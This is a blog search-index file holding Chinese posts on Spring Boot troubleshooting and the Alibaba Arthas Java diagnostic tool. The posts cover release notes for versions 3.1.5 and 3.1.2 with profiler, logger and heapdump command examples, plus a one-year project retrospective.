<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>深入Spring Boot系列</title>
    <url>/spring-boot-inside/</url>
    <content><![CDATA[<h2 id="原理-使用"><a href="#原理-使用" class="headerlink" title="原理/使用"></a>原理/使用</h2><ul>
<li><a href="/spring-boot-application-start-analysis">spring boot应用启动原理分析</a></li>
<li><a href="/spring-boot-executable-jar">spring boot executable jar/war 原理</a></li>
<li><a href="/spring-boot-classloader">深入Spring Boot：ClassLoader的继承关系和影响</a></li>
<li><a href="/spring-boot-context">深入Spring Boot：Spring Context的继承关系和影响</a></li>
<li><a href="/spring-boot-fat-jar-jsp-sample">深入Spring Boot：实现对Fat Jar jsp的支持</a></li>
<li><a href="/spring-boot-dubbo-hystrix/">深入Spring Boot：快速集成Dubbo + Hystrix</a></li>
<li><a href="/spring-scan-annotation/">正确实现用spring扫描自定义的annotation</a></li>
<li><a href="/spring-boot-starter-compatibility">深入Spring Boot：编写兼容Spring Boot1和Spring Boot2的Starter</a></li>
</ul>
<h2 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h2><ul>
<li><a href="/hibernate-validar-noclassdefounderror">深入JVM分析spring-boot应用hibernate-validator NoClassDefFoundError</a></li>
<li><a href="/spring-placeholder-inject-failed-cases">深入Spring Boot：那些注入不了的Spring占位符（${}表达式）</a></li>
<li><a href="/spring-boot-ArrayStoreException/">深入Spring Boot：怎样排查 java.lang.ArrayStoreException</a></li>
<li><a href="/spring-boot-database-type-none/">深入Spring Boot：排查 Cannot determine embedded database driver class for database type NONE</a></li>
<li><a href="/spring-boot-expected-single-but-found-2">深入Spring Boot：排查expected single matching bean but found 2的异常</a></li>
<li><a href="/spring-boot-transactional-nullpointerexception">深入Spring Boot：排查@Transactional引起的NullPointerException</a></li>
<li><a href="/spring-boot-enablewebmvc-static-404">深入Spring Boot：显式配置 @EnableWebMvc 导致静态资源访问失败</a></li>
<li><a href="/spring-boot-arthas-NoSuchMethodError">深入Spring Boot：利用Arthas排查NoSuchMethodError</a></li>
<li><a href="/arthas-spring-boot-404-401">Arthas实践–快速排查Spring Boot应用404/401问题</a></li>
<li><a href="/arthas-spring-context">Alibaba Arthas实践–获取到Spring Context，然后为所欲为</a></li>
<li><a href="/arthas-springmvc-controller">Alibaba Arthas实践–是哪个Controller处理了请求？</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Alibaba Arthas 3.1.5版本支持火焰图，快速定位应用热点</title>
    <url>/arthas-3.1.5/</url>
    <content><![CDATA[<p><img src="https://alibaba.github.io/arthas/_images/arthas.png" alt="Arthas"></p>
<p><code>Arthas</code>是Alibaba开源的Java诊断工具，深受开发者喜爱。</p>
<ul>
<li>Github： <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas" target="_blank" rel="noopener">https://alibaba.github.io/arthas</a></li>
</ul>
<p>Arthas 3.1.5版本带来下面全新的特性：</p>
<ul>
<li>开箱即用的Profiler/火焰图功能</li>
<li>grep命令支持更丰富的选项</li>
<li>monitor/tt/trace等命令提供更精确的时间统计</li>
<li>telnet/http协议共用3658端口</li>
</ul>
<h2 id="Profiler-Flame-Graph-火焰图"><a href="#Profiler-Flame-Graph-火焰图" class="headerlink" title="Profiler/Flame Graph/火焰图"></a>Profiler/Flame Graph/火焰图</h2><p>火焰图的威名相信大家都有所耳闻，但可能因为使用比较复杂，所以望而止步。</p>
<p>在新版本的Arthas里集成了<a href="https://github.com/jvm-profiling-tools/async-profiler" target="_blank" rel="noopener">async-profiler</a>，使用<code>profiler</code>命令就可以很方便地生成火焰图，并且可以在浏览器里直接查看。</p>
<ul>
<li>profiler命令wiki: <a href="https://alibaba.github.io/arthas/profiler.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/profiler.html</a></li>
</ul>
<p><code>profiler</code> 命令基本运行结构是 <code>profiler action [actionArg]</code>。 下面介绍如何使用。</p>
<h3 id="启动profiler"><a href="#启动profiler" class="headerlink" title="启动profiler"></a>启动profiler</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ profiler start</span><br><span class="line">Started [cpu] profiling</span><br></pre></td></tr></table></figure>
<blockquote>
<p>默认情况下，生成的是cpu的火焰图，即event为<code>cpu</code>。可以用<code>--event</code>参数来指定。</p>
</blockquote>
<h3 id="获取已采集的sample的数量"><a href="#获取已采集的sample的数量" class="headerlink" title="获取已采集的sample的数量"></a>获取已采集的sample的数量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ profiler getSamples</span><br><span class="line">23</span><br></pre></td></tr></table></figure>
<h3 id="查看profiler状态"><a href="#查看profiler状态" class="headerlink" title="查看profiler状态"></a>查看profiler状态</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ profiler status</span><br><span class="line">[cpu] profiling is running <span class="keyword">for</span> 4 seconds</span><br></pre></td></tr></table></figure>
<p>可以查看当前profiler在采样哪种<code>event</code>和采样时间。</p>
<h3 id="生成svg格式结果"><a href="#生成svg格式结果" class="headerlink" title="生成svg格式结果"></a>生成svg格式结果</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ profiler stop</span><br><span class="line">profiler output file: /tmp/demo/arthas-output/20191125-135546.svg</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
<p>默认情况下，生成的结果保存到应用的<code>工作目录</code>下的<code>arthas-output</code>目录里。</p>
<h3 id="通过浏览器查看arthas-output下面的profiler结果"><a href="#通过浏览器查看arthas-output下面的profiler结果" class="headerlink" title="通过浏览器查看arthas-output下面的profiler结果"></a>通过浏览器查看arthas-output下面的profiler结果</h3><p>默认情况下，arthas使用3658端口，则可以打开： <a href="http://localhost:3658/arthas-output/" target="_blank" rel="noopener">http://localhost:3658/arthas-output/</a> 查看到<code>arthas-output</code>目录下面的profiler结果：</p>
<p><img src="https://alibaba.github.io/arthas/_images/arthas-output.jpg" alt></p>
<p>点击可以查看具体的结果：</p>
<p><img src="https://alibaba.github.io/arthas/_images/arthas-output-svg.jpg" alt></p>
<blockquote>
<p>如果是chrome浏览器，可能需要多次刷新。</p>
</blockquote>
<h2 id="grep命令支持更丰富的选项"><a href="#grep命令支持更丰富的选项" class="headerlink" title="grep命令支持更丰富的选项"></a>grep命令支持更丰富的选项</h2><p>标准的linux grep命令支持丰富的选项，可以很方便地定位结果的上下文等。</p>
<p>新版本的<code>grep</code>命令支持更多标准的选项，下面是一些例子:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysprop | grep java</span><br><span class="line">sysprop | grep java -n</span><br><span class="line">sysenv | grep -v JAVA</span><br><span class="line">sysenv | grep -e <span class="string">"(?i)(JAVA|sun)"</span> -m 3  -C 2</span><br><span class="line">sysenv | grep JAVA -A2 -B3</span><br><span class="line">thread | grep -m 10 -e  <span class="string">"TIMED_WAITING|WAITING"</span></span><br></pre></td></tr></table></figure>
<p>感谢社区里 @qxo 的贡献。</p>
<h2 id="telnet-http协议共用3658端口"><a href="#telnet-http协议共用3658端口" class="headerlink" title="telnet/http协议共用3658端口"></a>telnet/http协议共用3658端口</h2><p>默认情况下，Arthas的Telnet端口是3658，HTTP端口是8563，这个常常让用户迷惑。在新版本里，在3658端口同时支持Telnet/HTTP协议。</p>
<p>在浏览器里访问 <a href="http://localhost:3658/" target="_blank" rel="noopener">http://localhost:3658/</a> 也可以访问到Web Console了。</p>
<p>在后续的版本里，考虑默认只侦听 3658端口，减少用户的配置项。</p>
<h2 id="monitor-tt-trace等命令提供更精确的时间统计"><a href="#monitor-tt-trace等命令提供更精确的时间统计" class="headerlink" title="monitor/tt/trace等命令提供更精确的时间统计"></a>monitor/tt/trace等命令提供更精确的时间统计</h2><p>以前Arthas被诟病比较多的一个问题是，monitor/tt/trace等命令时间统计误差大。因为以前只使用了一个int来保存时间，所以不精确。</p>
<p>在新版本里，改用一个高效的stack来保存数据，时间的准确度大大提升，欢迎大家反馈效果。</p>
<p>感谢社区里 @huangjIT 的贡献。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总之，<code>3.1.5</code>版本的Arthas引入了开箱即用的Profiler/火焰图功能，欢迎大家使用反馈。</p>
<ul>
<li>Release Note: <a href="https://github.com/alibaba/arthas/releases/tag/arthas-all-3.1.5" target="_blank" rel="noopener">https://github.com/alibaba/arthas/releases/tag/arthas-all-3.1.5</a></li>
<li>火焰图的一个参考文章：<a href="https://openresty.org/posts/dynamic-tracing/" target="_blank" rel="noopener">https://openresty.org/posts/dynamic-tracing/</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>profiler</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas开源一周年，Github Star 16K，我们一直在坚持什么？</title>
    <url>/arthas-one-year/</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>最近看到一个很流行的标题，《开源XX年，star XXX，我是如何坚持的》。</p>
<p>看到这样的标题，忽然发觉Arthas从2018年9月开源以来，刚好一年了，正好在这个秋高气爽的时节做下总结和回顾。</p>
<p><img src="https://alibaba.github.io/arthas/_images/arthas.png" alt="Arthas"></p>
<p><code>Arthas</code>是Alibaba开源的Java诊断工具，深受开发者喜爱。</p>
<ul>
<li>Github： <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas" target="_blank" rel="noopener">https://alibaba.github.io/arthas</a></li>
</ul>
<p>回顾Arthas Star数的历史，一直保持快速增长，目前已经突破16K。</p>
<p><img src="https://user-images.githubusercontent.com/1683936/65661356-05ca3480-e064-11e9-92ea-8cc21e45a71f.png" alt="Arthas Github Star历史曲线"></p>
<p>感谢用户的支持，既是压力也是动力。在过去开源的一年里，Arthas发布了7个Release版本，我们一直坚持三点：</p>
<ul>
<li>持续改进易用性</li>
<li>持续增加好用的命令</li>
<li>从开源社区中获取力量，回报社区</li>
</ul>
<h2 id="持续改进易用性"><a href="#持续改进易用性" class="headerlink" title="持续改进易用性"></a>持续改进易用性</h2><p>Arthas一直把易用性放在第一位，在开源之后，我们做了下面的改进：</p>
<ul>
<li>开发arthas boot，支持Windows/Linux/Mac统一体验</li>
<li>丝滑的自动补全，参考了jshell的体验</li>
<li>高效的历史命令匹配，<code>Up/Down</code>直达</li>
<li>改进类搜索匹配功能，更好支持lambda和内部类</li>
<li>完善重定向机制</li>
<li>支持JDK 9/10/11</li>
<li>支持Docker</li>
<li>支持rpm/deb包安装</li>
</ul>
<p>尽管我们在易用性下了很大的功夫，但是发现很多时候用户比较难入门，因此，我们参考了k8s的 Interactive Tutorial，推出了Arthas的在线教程：</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-basics" target="_blank" rel="noopener">Arthas基础教程</a></li>
<li><a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-advanced" target="_blank" rel="noopener">Arthas进阶教程</a></li>
</ul>
<p>通过基础教程，可以在交互终端里一步步入门，通过进阶教程可以深入理解Arthas排查问题的案例。</p>
<p>另外，为了方便用户大规模部署，我们实现了tunnel server和用户数据回报功能：</p>
<ul>
<li>增加tunnel server，统一管理Agent连接</li>
<li>增加用户数据回报功能，方便做安全管控</li>
</ul>
<h2 id="持续增加好用的命令"><a href="#持续增加好用的命令" class="headerlink" title="持续增加好用的命令"></a>持续增加好用的命令</h2><p>Arthas号称是Java应用诊断利器，那么我们自己要对得起这个口号。在开源之后，Arthas持续增加了10多个命令。</p>
<ul>
<li>ognl      命令任意代码执行</li>
<li>mc        线上内存编译器</li>
<li>redefine  命令线上热更新代码</li>
<li>logger    命令一键查看应用里的所有logger配置</li>
<li>sysprop   查看更新System Properties</li>
<li>sysenv    查看环境变量</li>
<li>vmoption  查看更新VM option</li>
<li>logger    查看logger配置，更新level</li>
<li>mbean     查看JMX信息</li>
<li>heapdump  堆内存快照</li>
</ul>
<p>下面重点介绍两个功能。</p>
<h3 id="jad-mc-redefine-一条龙热更新线上代码"><a href="#jad-mc-redefine-一条龙热更新线上代码" class="headerlink" title="jad/mc/redefine 一条龙热更新线上代码"></a>jad/mc/redefine 一条龙热更新线上代码</h3><p>以 <a href="https://alibaba.github.io/arthas/arthas-tutorials?language=cn&amp;id=arthas-advanced" target="_blank" rel="noopener">Arthas在线教程</a> 里的<code>UserController</code>为例：</p>
<ol>
<li><p>使用jad反编译代码</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jad --<span class="built_in">source</span>-only com.example.demo.arthas.user.UserController &gt; /tmp/UserController.java</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用vim编译代码</p>
<p> 当 user id 小于1时，也正常返回，不抛出异常：</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/user/&#123;id&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> User <span class="title">findUserById</span><span class="params">(@PathVariable Integer id)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">"id: &#123;&#125;"</span> , id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id != <span class="keyword">null</span> &amp;&amp; id &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">"name"</span> + id);</span><br><span class="line">        <span class="comment">// throw new IllegalArgumentException("id &lt; 1");</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User(id, <span class="string">"name"</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>mc</code>命令编译修改后的<code>UserController.java</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mc /tmp/UserController.java -d /tmp</span><br><span class="line">Memory compiler output:</span><br><span class="line">/tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">Affect(row-cnt:1) cost <span class="keyword">in</span> 346 ms</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>redefine</code>命令，因为可以热更新代码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redefine /tmp/com/example/demo/arthas/user/UserController.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="通过logger命令查看配置，修改level"><a href="#通过logger命令查看配置，修改level" class="headerlink" title="通过logger命令查看配置，修改level"></a>通过logger命令查看配置，修改level</h3><p>在网站压力大的时候（比如双11），有个缓解措施就是把应用的日志level修改为ERROR。 那么有两个问题：</p>
<ul>
<li>复杂应用的日志系统可能会有多个，那么哪个日志系统配置真正生效了？</li>
<li>怎样在线上动态修改logger的level？</li>
</ul>
<p>通过<code>logger</code>命令，可以查看应用里logger的详细配置信息，比如<code>FileAppender</code>输出的文件，<code>AsyncAppender</code>是否<code>blocking</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@2062]$ logger</span><br><span class="line"> name                                   ROOT</span><br><span class="line"> class                                  ch.qos.logback.classic.Logger</span><br><span class="line"> classLoader                            sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line"> classLoaderHash                        2a139a55</span><br><span class="line"> level                                  INFO</span><br><span class="line"> effectiveLevel                         INFO</span><br><span class="line"> additivity                             <span class="literal">true</span></span><br><span class="line"> codeSource                             file:/Users/hengyunabc/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar</span><br><span class="line"> appenders                              name            CONSOLE</span><br><span class="line">                                        class           ch.qos.logback.core.ConsoleAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        target          System.out</span><br><span class="line">                                        name            APPLICATION</span><br><span class="line">                                        class           ch.qos.logback.core.rolling.RollingFileAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        file            app.log</span><br><span class="line">                                        name            ASYNC</span><br><span class="line">                                        class           ch.qos.logback.classic.AsyncAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        blocking        <span class="literal">false</span></span><br><span class="line">                                        appenderRef     [APPLICATION]</span><br></pre></td></tr></table></figure>
<p>也可以在线修改logger的level：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@2062]$ logger --name ROOT --level debug</span><br><span class="line">update logger level success.</span><br></pre></td></tr></table></figure>
<h2 id="从开源社区中获取力量，回报社区"><a href="#从开源社区中获取力量，回报社区" class="headerlink" title="从开源社区中获取力量，回报社区"></a>从开源社区中获取力量，回报社区</h2><h3 id="感谢67位Contributors"><a href="#感谢67位Contributors" class="headerlink" title="感谢67位Contributors"></a>感谢67位Contributors</h3><p>Arthas开源以来，一共有67位 Contributors，感谢他们贡献的改进：</p>
<p> <img src="https://opencollective.com/arthas/contributors.svg?width=890&amp;button=false" alt="Arthas Contributors"></p>
<p>社区提交了一系列的改进，下面列出一些点（不完整）：</p>
<ul>
<li>翻译了大部分英文文档的</li>
<li>trace命令支持行号</li>
<li>打包格式支持rpm/deb</li>
<li>改进命令行提示符为 <code>arthas@pid</code></li>
<li>改进对windows的支持</li>
<li>增加<code>mbean</code>命令</li>
<li>改进webconsole的体验</li>
</ul>
<p>另外，有83个公司/组织登记了他们的使用信息，欢迎更多的用户来登记：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/65661477-5772bf00-e064-11e9-91c1-5cd32b09e7c6.png" alt="Arthas Users"></p>
<h3 id="洐生项目"><a href="#洐生项目" class="headerlink" title="洐生项目"></a>洐生项目</h3><p>基于Arthas，还产生了一些洐生项目，下面是其中两个：</p>
<ul>
<li>Bistoury: 去哪儿网开源的集成了Arthas的项目</li>
<li>arthas-mvel: 一个使用MVEL脚本的fork</li>
</ul>
<h3 id="用户案例分享"><a href="#用户案例分享" class="headerlink" title="用户案例分享"></a>用户案例分享</h3><p>广大用户在使用Arthas排查问题过程中，分享了很多排查过程和心得，欢迎大家来分享。</p>
<p><img src="https://user-images.githubusercontent.com/1683936/65661495-5cd00980-e064-11e9-98e5-4b76956af1c4.png" alt="Arthas用户案例分享"></p>
<h3 id="回馈开源"><a href="#回馈开源" class="headerlink" title="回馈开源"></a>回馈开源</h3><p>Arthas本身使用了很多开源项目的代码，在开源过程中，我们给netty, ognl, cfr等都贡献了改进代码，回馈上游。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p> 在做Arthas宣传小册子时，Arthas的宣传语是：</p>
<blockquote>
<p>“赠人玫瑰之手，经久犹有余香”</p>
</blockquote>
<p>希望Arthas未来能帮助到更多的用户解决问题，也希望广大的开发者对Arthas提出更多的改进和建议。</p>
<p>最后是抽奖环节，大家可以转发文章，在公众号后台留言自己和Arthas的故事，或者给Arthas提出建议，奖品是Arthas的卫衣一件：</p>
<p><img src="https://user-images.githubusercontent.com/1683936/65737523-619ec700-e111-11e9-8e3f-f91edfd33084.png" alt="Arthas卫衣"></p>
<h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p>欢迎关注横云断岭的专栏，专注Java，Spring Boot，Arthas，Dubbo。</p>
<p><img src="http://hengyunabc.github.io/img/qrcode_gongzhonghao.jpg" alt="横云断岭的专栏"></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>logger</tag>
      </tags>
  </entry>
  <entry>
    <title>Alibaba Arthas 3.1.2版本增加logger/heapdump/vmoption命令，增加tunnel server功能</title>
    <url>/arthas-3.1.2/</url>
    <content><![CDATA[<p><img src="https://alibaba.github.io/arthas/_images/arthas.png" alt="Arthas"></p>
<p><code>Arthas</code>是Alibaba开源的Java诊断工具，深受开发者喜爱。</p>
<ul>
<li>Github： <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>文档：<a href="https://alibaba.github.io/arthas" target="_blank" rel="noopener">https://alibaba.github.io/arthas</a></li>
</ul>
<p>Arthas 3.1.2版本持续增加新特性，下面重点介绍：</p>
<ul>
<li><code>logger/heapdump/vmoption/stop</code>命令</li>
<li>通过tunnel server连接不同网络的arthas，方便统一管控</li>
<li>易用性持续提升：提示符修改为<code>arthas@pid</code>形式，支持<code>ctrl + k</code>清屏快捷键</li>
</ul>
<h2 id="logger-heapdump-vmoption-stop命令"><a href="#logger-heapdump-vmoption-stop命令" class="headerlink" title="logger/heapdump/vmoption/stop命令"></a>logger/heapdump/vmoption/stop命令</h2><h3 id="logger命令"><a href="#logger命令" class="headerlink" title="logger命令"></a>logger命令</h3><blockquote>
<p>查看logger信息，更新logger level</p>
</blockquote>
<ul>
<li><a href="https://alibaba.github.io/arthas/logger.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/logger.html</a></li>
</ul>
<h4 id="查看所有logger信息"><a href="#查看所有logger信息" class="headerlink" title="查看所有logger信息"></a>查看所有logger信息</h4><p>以下面的<code>logback.xml</code>为例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"APPLICATION"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>app.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>mylog-%d&#123;yyyy-MM-dd&#125;.%i.txt<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>60<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">totalSizeCap</span>&gt;</span>2GB<span class="tag">&lt;/<span class="name">totalSizeCap</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%logger&#123;35&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"ASYNC"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.AsyncAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"APPLICATION"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"CONSOLE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;35&#125; - %msg %n</span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>utf8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"CONSOLE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ASYNC"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用<code>logger</code>命令打印的结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@2062]$ logger</span><br><span class="line"> name                                   ROOT</span><br><span class="line"> class                                  ch.qos.logback.classic.Logger</span><br><span class="line"> classLoader                            sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line"> classLoaderHash                        2a139a55</span><br><span class="line"> level                                  INFO</span><br><span class="line"> effectiveLevel                         INFO</span><br><span class="line"> additivity                             <span class="literal">true</span></span><br><span class="line"> codeSource                             file:/Users/hengyunabc/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar</span><br><span class="line"> appenders                              name            CONSOLE</span><br><span class="line">                                        class           ch.qos.logback.core.ConsoleAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        target          System.out</span><br><span class="line">                                        name            APPLICATION</span><br><span class="line">                                        class           ch.qos.logback.core.rolling.RollingFileAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        file            app.log</span><br><span class="line">                                        name            ASYNC</span><br><span class="line">                                        class           ch.qos.logback.classic.AsyncAppender</span><br><span class="line">                                        classLoader     sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line">                                        classLoaderHash 2a139a55</span><br><span class="line">                                        appenderRef     [APPLICATION]</span><br></pre></td></tr></table></figure>
<p>从<code>appenders</code>的信息里，可以看到</p>
<ul>
<li><code>CONSOLE</code> logger的target是<code>System.out</code></li>
<li><code>APPLICATION</code> logger是<code>RollingFileAppender</code>，它的file是<code>app.log</code></li>
<li><code>ASYNC</code>它的<code>appenderRef</code>是<code>APPLICATION</code>，即异步输出到文件里</li>
</ul>
<h4 id="查看指定名字的logger信息"><a href="#查看指定名字的logger信息" class="headerlink" title="查看指定名字的logger信息"></a>查看指定名字的logger信息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@2062]$ logger -n org.springframework.web</span><br><span class="line"> name                                   org.springframework.web</span><br><span class="line"> class                                  ch.qos.logback.classic.Logger</span><br><span class="line"> classLoader                            sun.misc.Launcher<span class="variable">$AppClassLoader</span>@2a139a55</span><br><span class="line"> classLoaderHash                        2a139a55</span><br><span class="line"> level                                  null</span><br><span class="line"> effectiveLevel                         INFO</span><br><span class="line"> additivity                             <span class="literal">true</span></span><br><span class="line"> codeSource                             file:/Users/hengyunabc/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar</span><br></pre></td></tr></table></figure>
<h4 id="更新logger-level"><a href="#更新logger-level" class="headerlink" title="更新logger level"></a>更新logger level</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@2062]$ logger --name ROOT --level debug</span><br><span class="line">update logger level success.</span><br></pre></td></tr></table></figure>
<h3 id="heapdump命令"><a href="#heapdump命令" class="headerlink" title="heapdump命令"></a>heapdump命令</h3><blockquote>
<p>dump java heap, 类似jmap命令的heap dump功能。</p>
</blockquote>
<ul>
<li><a href="https://alibaba.github.io/arthas/heapdump.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/heapdump.html</a></li>
</ul>
<h4 id="dump到指定文件"><a href="#dump到指定文件" class="headerlink" title="dump到指定文件"></a>dump到指定文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@58205]$ heapdump /tmp/dump.hprof</span><br><span class="line">Dumping heap to /tmp/dump.hprof...</span><br><span class="line">Heap dump file created</span><br></pre></td></tr></table></figure>
<h4 id="只dump-live对象"><a href="#只dump-live对象" class="headerlink" title="只dump live对象"></a>只dump live对象</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[arthas@58205]$ heapdump --live /tmp/dump.hprof</span><br><span class="line">Dumping heap to /tmp/dump.hprof...</span><br><span class="line">Heap dump file created</span><br></pre></td></tr></table></figure>
